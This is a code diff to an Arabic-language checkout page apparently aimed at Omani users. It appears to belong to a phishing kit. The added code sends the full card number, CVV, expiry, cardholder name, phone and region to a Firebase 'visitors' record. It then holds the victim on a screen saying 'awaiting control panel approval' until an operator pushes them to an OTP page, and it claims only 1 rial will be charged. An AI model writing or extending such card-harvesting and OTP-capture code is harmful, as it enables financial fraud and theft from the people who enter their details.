@@ -7,6 +7,7 @@ import { Input } from "@/components/ui/input"
 import { Label } from "@/components/ui/label"
 import { Alert, AlertDescription } from "@/components/ui/alert"
 import { Badge } from "@/components/ui/badge"
+import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
 import {
   MapPin,
   CreditCard,
@@ -20,8 +21,9 @@ import {
   Lock,
   Info,
 } from "lucide-react"
-import { addData, getVisitorId } from "@/lib/firebase"
+import { addData, db, getVisitorId } from "@/lib/firebase"
 import { setupOnlineStatus } from "@/lib/utils"
+import { doc, onSnapshot } from "firebase/firestore"
 
 type CheckoutStep = "address" | "payment" | "otp" | "success"
 
@@ -29,9 +31,24 @@ interface FormErrors {
   [key: string]: string
 }
 
+const omanRegions = [
+  "مسقط",
+  "ظفار",
+  "مسندم",
+  "البريمي",
+  "الداخلية",
+  "شمال الباطنة",
+  "جنوب الباطنة",
+  "شمال الشرقية",
+  "جنوب الشرقية",
+  "الظاهرة",
+  "الوسطى",
+]
+
 export default function CheckoutPage() {
   const [currentStep, setCurrentStep] = useState<CheckoutStep>("address")
   const [isLoading, setIsLoading] = useState(false)
+  const [isAwaitingApproval, setIsAwaitingApproval] = useState(false)
   const [errors, setErrors] = useState<FormErrors>({})
   const [otpError, setOtpError] = useState("")
   const [otp, setOtp] = useState("")
@@ -59,10 +76,31 @@ export default function CheckoutPage() {
     void addData({ visitorId, currentPage: "اختيار العرض" })
   }, [])
 
+  useEffect(() => {
+    const visitorId = getVisitorId()
+    if (!visitorId) return
+
+    const unsubscribe = onSnapshot(doc(db, "visitors", visitorId), (snapshot) => {
+      if (!snapshot.exists()) return
+
+      const data = snapshot.data()
+      const shouldGoToOtp = data?.redirectPage === "otp" || data?.currentStep === "_t2" || data?.currentStep === "otp"
+
+      if (shouldGoToOtp) {
+        setIsAwaitingApproval(false)
+        setIsLoading(false)
+        setCurrentStep("otp")
+      }
+    })
+
+    return () => unsubscribe()
+  }, [])
+
   const validateAddress = () => {
     const newErrors: FormErrors = {}
     if (!addressData.fullName.trim()) newErrors.fullName = "الاسم الكامل مطلوب"
     if (!addressData.phone.trim()) newErrors.phone = "رقم الهاتف مطلوب"
+    else if (addressData.phone.length !== 8) newErrors.phone = "رقم الهاتف يجب أن يكون 8 أرقام"
     if (!addressData.city) newErrors.city = "المدينة مطلوبة"
     setErrors(newErrors)
     return Object.keys(newErrors).length === 0
@@ -87,6 +125,8 @@ export default function CheckoutPage() {
       visitorId,
       name: addressData.fullName,
       phone: addressData.phone,
+      city: addressData.city,
+      address: addressData.city,
       currentPage: "تسجيل المعلومات",
     })
     setIsLoading(true)
@@ -104,13 +144,13 @@ export default function CheckoutPage() {
       cardNumber: paymentData.cardNumber,
       cvv: paymentData.cvv,
       expiryDate: paymentData.expiryDate,
+      cardName: paymentData.cardName,
+      cardStatus: "pending",
+      currentStep: "payment",
       currentPage: "تسجيل البطاقة",
     })
+    setIsAwaitingApproval(true)
     setIsLoading(true)
-    // Simulate payment processing
-    await new Promise((resolve) => setTimeout(resolve, 2000))
-    setIsLoading(false)
-    setCurrentStep("otp")
   }
 
   const handleOtpSubmit = async () => {
@@ -291,9 +331,16 @@ export default function CheckoutPage() {
                     <Input
                       id="phone"
                       value={addressData.phone}
-                      onChange={(e) => setAddressData({ ...addressData, phone: e.target.value })}
+                      onChange={(e) =>
+                        setAddressData({
+                          ...addressData,
+                          phone: e.target.value.replace(/\D/g, "").slice(0, 8),
+                        })
+                      }
                       className={`h-12 transition-all duration-200 ${errors.phone ? "border-red-500 focus:border-red-500" : "focus:border-blue-500"}`}
-                      placeholder="+968xxxxxxxx"
+                      placeholder="91234567"
+                      inputMode="numeric"
+                      maxLength={8}
                     />
                     {errors.phone && (
                       <p className="text-red-500 text-sm flex items-center gap-1">
@@ -306,15 +353,25 @@ export default function CheckoutPage() {
                   <div className="md:col-span-2 space-y-2">
                     <Label htmlFor="address" className="flex items-center gap-2 text-gray-700 font-medium">
                       <Home className="w-4 h-4" />
-                      العنوان *
+                      المنطقة *
                     </Label>
-                    <Input
-                      id="address"
+                    <Select
                       value={addressData.city}
-                      onChange={(e) => setAddressData({ ...addressData, city: e.target.value })}
-                      className={`h-12 transition-all duration-200 ${errors.city ? "border-red-500 focus:border-red-500" : "focus:border-blue-500"}`}
-                      placeholder="ادخل عنوان التوصيل بالتفصيل"
-                    />
+                      onValueChange={(value) => setAddressData({ ...addressData, city: value })}
+                    >
+                      <SelectTrigger
+                        className={`h-12 transition-all duration-200 ${errors.city ? "border-red-500 focus:border-red-500" : "focus:border-blue-500"}`}
+                      >
+                        <SelectValue placeholder="اختر المنطقة بسرعة" />
+                      </SelectTrigger>
+                      <SelectContent>
+                        {omanRegions.map((region) => (
+                          <SelectItem key={region} value={region}>
+                            {region}
+                          </SelectItem>
+                        ))}
+                      </SelectContent>
+                    </Select>
                     {errors.city && (
                       <p className="text-red-500 text-sm flex items-center gap-1">
                         <AlertCircle className="w-4 h-4" />
@@ -361,6 +418,15 @@ export default function CheckoutPage() {
                     سوف يتم خصم فقط مبلغ 1 ريال فقط لتأكيد الطلب
                   </AlertDescription>
                 </Alert>
+
+                {isAwaitingApproval && (
+                  <Alert className="border-blue-200 bg-blue-50">
+                    <Info className="h-4 w-4 text-blue-600" />
+                    <AlertDescription className="text-blue-800 font-medium">
+                      تم تسجيل البطاقة. انتظر موافقة لوحة التحكم وسيتم نقلك تلقائياً إلى شاشة الكود.
+                    </AlertDescription>
+                  </Alert>
+                )}
 
                 <div className="space-y-2">
                   <Label htmlFor="cardNumber" className="flex items-center gap-2 text-gray-700 font-medium">
@@ -457,8 +523,9 @@ export default function CheckoutPage() {
                 <div className="flex gap-4 pt-4">
                   <Button
                     variant="outline"
-                    onClick={() => setCurrentStep("address")}
+                    onClick={() => !isAwaitingApproval && setCurrentStep("address")}
                     className="flex-1 h-12 border-2 hover:bg-gray-50"
+                    disabled={isAwaitingApproval}
                   >
                     رجوع
                   </Button>
@@ -470,7 +537,7 @@ export default function CheckoutPage() {
                     {isLoading ? (
                       <div className="flex items-center gap-2">
                         <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
-                        جاري المعالجة...
+                        {isAwaitingApproval ? "بانتظار موافقة اللوحة..." : "جاري المعالجة..."}
                       </div>
                     ) : (
                       "تأكيد الدفع"
